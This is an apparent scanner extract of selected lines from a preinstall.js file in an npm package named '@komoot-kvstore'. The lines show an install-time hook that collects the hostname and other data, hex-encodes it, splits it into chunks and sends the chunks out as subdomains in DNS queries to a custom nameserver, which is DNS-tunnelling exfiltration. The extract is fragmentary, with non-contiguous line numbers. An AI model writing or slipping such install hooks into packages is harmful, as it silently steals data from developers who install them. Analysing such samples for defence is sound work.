// File: tmp/tmp7lfeh549/@komoot-kvstore/package/preinstall.js
// ======================================================================
Line 1: const dns = require('dns')
Line 3: const crypto = require('crypto')
Line 5: const os = require('os')
Line 7: const path = require('path')
Line 24: os.hostname()
Line 37: Buffer.from(jsonData).toString('hex')
Line 42: const id1 = crypto.randomBytes(6).toString('hex')
Line 44: const id2 = crypto.randomBytes(6).toString('hex')
Line 51: dns.resolve4(hostname, {resolver}, (err) => {

            if (err) reject(err);

            else resolve();

        })
Line 66: dns.resolve4(ns, (err, addresses) => {

        if (err) resolve('8.8.4.4');

        else resolve(addresses[0]);

    })
Line 77: {

    const resolver = [nsIp, '8.8.8.8'];


    chunks.forEach((chunk, idx) => {

        const host1 = `v2_f.${id1}.${idx}.${chunk}.v2_e${suffix}`;

        const host2 = `v2_f.${id2}.${idx}.${chunk}.v2_e${suffix}`;


        // Attempt DNS resolution

        resolveDns(host1, resolver).catch(() => {});

        resolveDns(host2, resolver).catch(() => {});

    });

}
Line 79: const resolver = [nsIp, '8.8.8.8']
